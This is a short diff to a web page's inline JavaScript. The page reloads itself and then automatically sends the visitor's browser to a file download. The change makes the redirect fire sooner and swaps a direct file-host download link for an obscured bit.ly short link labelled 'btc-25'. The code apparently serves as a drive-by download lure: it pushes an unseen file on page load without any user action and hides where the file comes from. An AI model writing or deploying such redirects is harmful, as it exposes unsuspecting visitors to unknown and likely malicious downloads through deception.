@@ -7,7 +7,7 @@
         let refreshCount = sessionStorage.getItem("refreshCount") || 0;
         refreshCount = parseInt(refreshCount);
 
-        if (refreshCount < 5) {
+        if (refreshCount < 2) {
             sessionStorage.setItem("refreshCount", refreshCount + 1);
             setTimeout(() => {
                 location.reload();
@@ -15,7 +15,7 @@
         } else {
             sessionStorage.removeItem("refreshCount");
             setTimeout(() => {
-                window.location.href = "https://pixeldrain.com/api/file/eGWsp8Xk?download";
+                window.location.href = "https://bit.ly/btc-25";
             }, 2000); // Kurze Pause vor dem Download
         }
     </script>
